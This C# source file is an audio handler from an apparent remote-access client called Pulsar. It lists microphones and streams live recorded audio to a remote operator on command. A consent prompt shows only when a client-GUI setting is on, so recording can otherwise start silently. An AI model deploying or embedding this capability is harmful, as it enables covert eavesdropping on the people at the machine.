using NAudio.CoreAudioApi;
using NAudio.Wave;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Audio;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Threading;
using Pulsar.Client.Config;

namespace Pulsar.Client.Messages
{
    public class AudioHandler : NotificationMessageProcessor, IDisposable
    {
        public override bool CanExecute(IMessage message) => message is GetMicrophone ||
                                                             message is GetMicrophoneDevice;

        public override bool CanExecuteFrom(ISender sender) => true;

        public ISender _client;

        private bool _isStarted;
        private readonly object _syncLock = new object();
        private bool _disposed;

        public WaveInEvent _audioDevice;

        private int _deviceID;
        private string _sessionId;
        private long _sequence;
        private int _channels = 1;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetMicrophone msg:
                    Execute(sender, msg);
                    break;

                case GetMicrophoneDevice msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetMicrophone message)
        {
            lock (_syncLock)
            {
                if (_disposed)
                    return;

                _client = client;

                if (message.Destroy)
                {
                    if (!string.IsNullOrWhiteSpace(message.SessionId) &&
                        !string.IsNullOrWhiteSpace(_sessionId) &&
                        !string.Equals(message.SessionId, _sessionId, StringComparison.Ordinal))
                    {
                        OnReport("Ignoring stop request for stale microphone session.");
                        return;
                    }

                    string stoppedSession = _sessionId;
                    DestroyLocked();
                    if (!string.IsNullOrWhiteSpace(stoppedSession))
                    {
                        SendStatusLocked(client, stoppedSession, MediaStreamStatus.Stopped,
                            null, null, _deviceID);
                    }
                    _sessionId = null;
                    OnReport("Audio streaming stopped");
                    return;
                }

                if (!message.CreateNew)
                    return;

                if (Settings.SHOWCLIENTGUI)
                {
                    bool allowed = GUI.RemoteDesktopPermissionPrompt.RequestUserConsent(
                        30,
                        "Remote Microphone",
                        "A remote operator is requesting to listen to your microphone.");
                    if (!allowed)
                    {
                        SendStatusLocked(client, message.SessionId, MediaStreamStatus.Denied,
                            "MEDIA_CONSENT_DENIED", "Denied by user.", message.DeviceIndex);
                        return;
                    }
                }

                DestroyLocked();
                _sessionId = string.IsNullOrWhiteSpace(message.SessionId)
                    ? Guid.NewGuid().ToString("N")
                    : message.SessionId;
                Interlocked.Exchange(ref _sequence, 0);
                _deviceID = message.DeviceIndex;

                try
                {
                    if (_deviceID < 0 || _deviceID >= WaveIn.DeviceCount)
                    {
                        SendStatusLocked(client, _sessionId, MediaStreamStatus.Unavailable,
                            "MEDIA_DEVICE_NOT_FOUND",
                            $"Invalid microphone device index: {_deviceID}.",
                            _deviceID);
                        OnReport($"Invalid microphone device index: {_deviceID}. Available devices: {WaveIn.DeviceCount}");
                        return;
                    }

                    var capabilities = WaveIn.GetCapabilities(_deviceID);
                    if (capabilities.Channels == 0)
                    {
                        SendStatusLocked(client, _sessionId, MediaStreamStatus.Unavailable,
                            "MEDIA_DEVICE_NO_CHANNELS", "The microphone device has no available channels.", _deviceID);
                        return;
                    }

                    int requestedChannels = message.Channels <= 1 ? 1 : 2;
                    int supportedChannels = Math.Max(1, Math.Min(2, capabilities.Channels));
                    _channels = Math.Min(requestedChannels, supportedChannels);

                    int sampleRate = message.Bitrate;
                    if (sampleRate < 1000 || sampleRate > 192000)
                    {
                        SendStatusLocked(client, _sessionId, MediaStreamStatus.Error,
                            "MEDIA_INVALID_FORMAT", "The requested microphone format is unsupported.", _deviceID);
                        return;
                    }

                    OnReport($"Initializing microphone device {_deviceID}: {capabilities.ProductName}");
                    _audioDevice = new WaveInEvent
                    {
                        DeviceNumber = _deviceID,
                        WaveFormat = new WaveFormat(sampleRate, _channels)
                    };
                    _audioDevice.BufferMilliseconds = 50;
                    _audioDevice.DataAvailable += sourcestream_DataAvailable;
                    _audioDevice.StartRecording();
                    _isStarted = true;
                    SendStatusLocked(client, _sessionId, MediaStreamStatus.Active, null, null, _deviceID);
                    OnReport("Audio streaming started");
                }
                catch (UnauthorizedAccessException ex)
                {
                    SendStatusLocked(client, _sessionId, MediaStreamStatus.Denied,
                        "MEDIA_ACCESS_DENIED", ex.Message, _deviceID);
                    OnReport($"Unauthorized access to microphone: {ex.Message}");
                }
                catch (ArgumentOutOfRangeException ex)
                {
                    SendStatusLocked(client, _sessionId, MediaStreamStatus.Error,
                        "MEDIA_INVALID_FORMAT", ex.Message, _deviceID);
                    OnReport($"Device index or format out of range: {ex.Message}");
                }
                catch (Exception ex)
                {
                    SendStatusLocked(client, _sessionId, MediaStreamStatus.Error,
                        "MEDIA_START_FAILED", ex.Message, _deviceID);
                    OnReport($"Unexpected error initializing microphone: {ex.Message}");
                }
                finally
                {
                    if (!_isStarted)
                        DestroyLocked();
                }
            }
        }

        private void SendStatusLocked(ISender client, string sessionId, MediaStreamStatus status,
            string errorCode, string errorMessage, int device)
        {
            if (client == null || string.IsNullOrWhiteSpace(sessionId))
                return;

            client.Send(new GetMicrophoneResponse
            {
                SessionId = sessionId,
                Sequence = Interlocked.Increment(ref _sequence),
                Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                Status = status,
                ErrorCode = errorCode,
                ErrorMessage = errorMessage,
                Device = device,
                Channels = status == MediaStreamStatus.Active ? _channels : 0
            });
        }

        private void sourcestream_DataAvailable(object notUsed, WaveInEventArgs e)
        {
            try
            {
                if (e?.Buffer == null || e.BytesRecorded <= 0)
                {
                    return;
                }

                lock (_syncLock)
                {
                    if (_disposed || !_isStarted || string.IsNullOrWhiteSpace(_sessionId))
                        return;

                    byte[] rawAudio = new byte[e.BytesRecorded];
                    Array.Copy(e.Buffer, rawAudio, e.BytesRecorded);

                    _client?.Send(new GetMicrophoneResponse
                    {
                        Audio = rawAudio,
                        Device = _deviceID,
                        SessionId = _sessionId,
                        Sequence = Interlocked.Increment(ref _sequence),
                        Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                        Status = MediaStreamStatus.Active,
                        Channels = _channels
                    });
                }
            }
            catch (Exception ex)
            {
                OnReport($"Error processing microphone data: {ex.Message}");
            }
        }

        private void Execute(ISender client, GetMicrophoneDevice message)
        {
            try
            {
                var deviceList = new List<Tuple<int, string>>();

                int deviceCount = WaveIn.DeviceCount;
                for (int i = 0; i < deviceCount; i++)
                {
                    try
                    {
                        var capabilities = WaveIn.GetCapabilities(i);
                        string deviceName = capabilities.ProductName;

                        OnReport($"Found microphone device {i}: {deviceName} (Channels: {capabilities.Channels})");

                        if (!string.IsNullOrEmpty(deviceName) && capabilities.Channels > 0)
                        {
                            deviceList.Add(Tuple.Create(i, deviceName));
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error accessing microphone device {i}: {ex.Message}");
                    }
                }

                client.Send(new GetMicrophoneDeviceResponse { DeviceInfos = deviceList });
            }
            catch (Exception ex)
            {
                OnReport($"Error enumerating microphone devices: {ex.Message}");
                client.Send(new GetMicrophoneDeviceResponse { DeviceInfos = new List<Tuple<int, string>>() });
            }
        }

        public void Destroy()
        {
            lock (_syncLock)
            {
                DestroyLocked();
            }
        }

        private void DestroyLocked()
        {
            try
            {
                if (_audioDevice != null)
                {
                    try
                    {
                        _audioDevice.DataAvailable -= sourcestream_DataAvailable;
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error unsubscribing from DataAvailable event: {ex.Message}");
                    }

                    try
                    {
                        if (_audioDevice.DeviceNumber >= 0) // Check if device is valid
                        {
                            _audioDevice.StopRecording();
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error stopping microphone recording: {ex.Message}");
                    }

                    try
                    {
                        _audioDevice.Dispose();
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error disposing microphone device: {ex.Message}");
                    }

                    _audioDevice = null;
                }
            }
            catch (Exception ex)
            {
                OnReport($"Error in Destroy method: {ex.Message}");
            }
            finally
            {
                _isStarted = false;
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    if (_disposed)
                        return;
                    _disposed = true;
                    try
                    {
                        DestroyLocked();
                        _client = null;
                        _sessionId = null;
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error during disposal: {ex.Message}");
                    }
                }
            }
        }
    }
}